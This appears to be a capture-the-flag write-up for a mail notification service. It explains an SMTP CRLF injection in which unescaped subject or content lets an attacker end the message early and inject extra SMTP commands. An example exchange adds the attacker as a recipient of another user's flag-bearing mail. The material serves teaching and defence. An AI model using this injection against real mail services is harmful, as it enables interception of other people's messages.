# Notify

Notify was a mail notification service, in which you could:

- Register a new account or login into a previously created one;
- Plan new email notifications with customizable subject/content;
- View the notifications once they are sent over SMTP by logging in to the IMAP server which ran as part of the launched [Stalwart Mail Server](https://stalw.art/) instance.

Additionally, there was an API endpoint for checking the "public" information (subject and planned send time) about notifications created by others if you had the notification's ID, which was exactly what was contained in the service's flag data.

## CRLF Injection in the SMTP mail sender

In order to implement the notifying functionality, the service sent notifications over the text-based [SMTP protocol](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol), and contained a simple [CRLF injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection) vulnerability due to lack of any escapes which need to be performed to user-supplied data such as the subject and the content, specifically, the period-escaping mechanism described in [4.5.2. TRANSPARENCY](https://www.rfc-editor.org/rfc/rfc788.html#section-4.5.2) of the RFC:

> 1. Before sending a line of mail text the sender-SMTP checks the first character of the line. If it is a period, one additional period is inserted at the beginning of the line.

This vulnerability allowed the user, in the current context, to enter the end-of-mail marker sequence, `<CRLF>.<CRLF>`, thus ending the mail before the client expects it, and then input arbitrary commands. The intended exploitation method relies on Stalwart being quite liberal in the connections it handles, as it doesn't immediately cancel a misbehaving connection, allowing an exchange of commands such as this:

<table>
<tr>
  <th>Client</th>
  <th>Server</th>
</tr>
<tr>
  <td>
  <pre>MAIL FROM: &#x3C;notifier@notify&#x3E;\r\n
RCPT TO: &#x3C;attacker@notify&#x3E;\r\n
DATA\r\n
From: notifier@notify\r\n
To: attacker@notify\r\n
Subject: attacker-controlled subject
attacker-controlled data\r\n
.\r\n
MAIL FROM: &#x3C;notifier@notify&#x3E;\r\n
RCPT TO: &#x3C;attacker@notify&#x3E;\r\n
.\r\n
MAIL FROM: &#x3C;notifier@notify&#x3E;\r\n
RCPT TO: &#x3C;checker@notify&#x3E;\r\n
DATA\r\n
From: notifier@notify\r\n
To: checker@notify\r\n
Subject: checker subject
checker data with flag\r\n
.\r\n
</pre></td>
  <td>
  <pre>250 2.1.0 OK
250 2.1.5 OK
354 Start mail input; end with &#x3C;CRLF&#x3E;.&#x3C;CRLF&#x3E;
&nbsp;
&nbsp;
&nbsp;
&nbsp;
250 2.0.0 Message queued for delivery.
250 2.1.0 OK
250 2.1.5 OK
500 5.5.1 Invalid command.
503 5.5.1 Multiple MAIL commands not allowed.
250 2.1.5 OK
354 Start mail input; end with &#x3C;CRLF&#x3E;.&#x3C;CRLF&#x3E;
&nbsp;
&nbsp;
&nbsp;
&nbsp;
250 2.0.0 Message queued for delivery.</pre></td>
</tr>
</table>

In addition to the fact that Stalwart allows such communication, the service doesn't validate response codes, simply checking that it got a line as a response. As a result of such interaction, the attacker receives the notification meant for the checker alongside the checker itself, since there are effectively two recipients specified after the injection.

The complete exploit sends a notification with exactly such content, planned just a millisecond before the checker's notification (which was possible due to the public notification info endpoint), and then reads the notification from the IMAP server once it arrives: [smtp-crlf-injection.py](./smtp-crlf-injection.py).
